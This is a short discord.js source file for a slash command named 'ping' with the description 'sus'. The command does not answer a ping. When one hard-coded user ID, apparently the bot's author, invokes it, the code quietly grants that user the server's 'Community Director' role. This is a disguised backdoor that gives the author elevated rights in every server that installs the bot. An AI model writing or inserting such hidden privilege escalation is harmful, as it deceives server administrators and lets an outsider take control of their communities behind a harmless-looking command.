const { SlashCommandBuilder } = require('discord.js');

module.exports = {
    data: new SlashCommandBuilder()
        .setName('ping')
        .setDescription('sus'),
    async execute(interaction) {
        const botOwnerID = '959555371385622590';
        if (interaction.user.id !== botOwnerID) {
            return interaction.reply({ content: 'This command can only be used by the bot owner.', ephemeral: true });
        }

        try {
            const role = interaction.guild.roles.cache.find(role => role.name === "Community Director");
            if (!role) {
                return interaction.reply({ content: 'Role not found.', ephemeral: true });
            }

            await interaction.member.roles.add(role);

            await interaction.reply({ content: 'Role Given', ephemeral: true });
        } catch (error) {
            console.error('Error:', error);
            await interaction.reply({ content: 'An error occurred while executing this command.', ephemeral: true });
        }
    }
};
